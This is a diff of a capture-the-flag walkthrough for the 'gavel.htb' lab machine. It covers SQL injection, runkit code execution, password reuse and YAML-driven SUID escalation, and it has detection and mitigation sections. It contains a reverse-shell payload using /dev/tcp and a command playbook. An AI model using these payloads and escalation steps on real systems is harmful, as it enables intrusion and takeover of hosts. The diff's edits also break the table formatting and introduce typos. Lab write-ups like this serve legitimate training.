@@ -9,7 +9,7 @@ Hints: True
 ## Summary of Attack Chain
 
 | Step | User / Access | Technique Used | Result |
-| --- | --- | --- | --- |
+|  |  |  |  |
 | 1 | `N/A` | **Port Scan & Host Discovery** | `nmap` revealed ports `22` (SSH) and `80` (HTTP). Added `gavel.htb` to `/etc/hosts`. |
 | 2 | `N/A` | **Directory Fuzzing** | `ffuf` discovered `/.git/` repository exposed on the web server. |
 | 3 | `N/A` | **Source Code Analysis** | Used `git-dumper` to extract source code. Identified SQLi vulnerability in `inventory.php` and RCE potential in admin rules. |
@@ -404,9 +404,9 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 # Short Notes
 
 
----
 
-## PHASE 1: STRATEGIC OVERVIEW
+
+## PHASE 1: Strategic Overview
 
 * **1.1 Definition** – The target is a web‑hosted auction platform (gavel.htb) running Apache 2.4.52 on Ubuntu with OpenSSH 8.9p1 exposed on port 22 and HTTP on port 80. The application hosts a public Git repository, an admin panel that dynamically executes PHP code via `runkit_function_add()`, and a local utility (`gavel‑util`) that processes YAML files under elevated privileges.
 * **1.2 Impact** – Primary objectives are to gain full control of the host: obtain user credentials, achieve remote code execution (RCE), pivot to the web server account (`www‑data`), elevate to the system user `auctioneer`, and finally acquire root via SUID escalation.
@@ -417,9 +417,9 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   * YAML injection via `gavel‑util` → disable PHP sandbox, copy `/bin/bash`, set SUID bit.  
   * Execute SUID binary → root shell and flag retrieval.
 
----
 
-## PHASE 2: SYSTEM ARCHITECTURE & THEORY
+
+## PHASE 2: System Archotecture & Theory
 
 * **2.1 Protocol Environment** – Linux (Ubuntu) with Apache 2.4.52, PHP 7.x (runkit extension enabled), OpenSSH 8.9p1, MySQL/MariaDB backend, and custom binaries in `/usr/local/bin/` (`gavel‑util`).  
 * **2.2 Attack Logic Flow**  
@@ -427,27 +427,27 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   Each hop exploits a privilege boundary: web → admin (SQLi), admin → web server (RCE), web server → system user (password reuse), system user → root (SUID).
 * **2.3 Theoretical Analogy** – Think of the application as a multi‑storey building with a compromised front door (SQLi) that lets an intruder into the lobby (admin panel). From there, a faulty elevator (runkit) allows the intruder to ride directly to the basement (www‑data), then use a master key (reused password) to enter the staff room (auctioneer). Finally, a hidden service desk (YAML injection) hands over a magic key (SUID bash) that opens all doors.
 
----
 
-## PHASE 3: THE ATTACK VECTOR (MECHANICS)
+
+## PHASE 3: The Attack Vector Mechanism
 
 ### THE CORE MECHANISM
 
 | Attribute | Technical Details |
-| --- | --- |
+|  |  |
 | **Primary Identifiers** | `inventory.php?user_id`, `sort` parameters; `admin.php` rule field (`runkit_function_add()`); `/usr/local/bin/gavel-util` YAML `rule` field. |
 | **Critical Vulnerability** | Unsanitized SQL query in `inventory.php`; dynamic PHP code execution via runkit; YAML parser executing arbitrary PHP code with elevated privileges. |
 | **Offensive Action** | 1) Inject backtick‑delimited payload to read users table and extract bcrypt hash. 2) Use stolen credentials to log into admin panel. 3) Insert reverse shell code in rule field (`system('bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"')`). 4) Trigger rule via `bid_handler.php`. 5) Stabilize shell, `su auctioneer` using reused password. 6) Craft two YAML files: one to overwrite `php.ini`, another to copy `/bin/bash` and set SUID bit. 7) Execute SUID binary with `-p` flag for root shell.
 
-### PREREQUISITES
+### Prerequisites
 
 * **Access Level** – Initial unauthenticated access to the web server; later admin credentials (SQLi‑derived).  
 * **Connectivity** – TCP 22, TCP 80; reverse shell over TCP 4444.  
 * **Target State** – Git repository publicly exposed (`/.git/`), runkit extension enabled in PHP, `gavel-util` executable with SUID privileges to the system user.
 
----
 
-## PHASE 4: THREAT HUNTING & ANOMALY ANALYSIS
+
+## PHASE 4: Threat Hunting & Anamoly Analysis
 
 * **Hunt Hypothesis**  
   *Technique:* SQL injection via backtick payload.  
@@ -461,9 +461,9 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   * `www‑data` shell + reused password → `su auctioneer`.  
   * `auctioneer` user executing YAML that writes to `/opt/gavel/.config/php/php.ini` and copies `/bin/bash` → SUID escalation.
 
----
 
-## PHASE 5: DETECTION ENGINEERING (BLUE TEAM)
+
+## PHASE 5: Detection Engineering
 
 * **Telemetry Gap Analysis** –  
   * Windows events are not applicable; focus on Linux auditd, syslog, and PHP logs.  
@@ -498,9 +498,9 @@ Heartbeat
   systemctl restart auditd
   ```
 
----
 
-## PHASE 6: TOOLKIT & IMPLEMENTATION
+
+## PHASE 6: Toolkit & Implementation
 
 * **Automation** –  
   * `nmap` for port discovery.  
@@ -520,9 +520,9 @@ Heartbeat
   * `gavel-util` for YAML injection; no additional exploits needed.  
   * `chmod u+s /opt/gavel/rootbash` to create SUID binary.
 
----
 
-## PHASE 7: DEFENSIVE MITIGATION
+
+## PHASE 7: Defensive Mitigation
 
 * **Technical Hardening** –  
   1. Disable the runkit extension or enforce strict sanitization of user input before passing to `runkit_function_add()`.  
@@ -533,12 +533,12 @@ Heartbeat
 
 * **Personnel Focus** – Train developers to validate input, perform code reviews of dynamic code execution paths, and restrict web server privileges (use least‑privilege).  
 
----
 
-## QUICK-ACTION PLAYBOOK
+
+## Quick Action Playbook
 
 | Step | Objective | Technical Command / Logic |
-| --- | --- | --- |
+|  |  |  |
 | **01** | Enumerate open ports | `nmap -sV -p- 10.129.4.66` |
 | **02** | Discover hidden directories | `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb/FUZZ -e .php` |
 | **03** | Clone exposed Git repo | `git-dumper http://gavel.htb/.git/ ./gavel-source` |
@@ -553,4 +553,5 @@ Heartbeat
 | **12** | Execute SUID binary | `/opt/gavel/rootbash -p` |
 | **13** | Retrieve root flag | `cat /root/root.txt` |
 
----
+
+**Thanks you for read!**
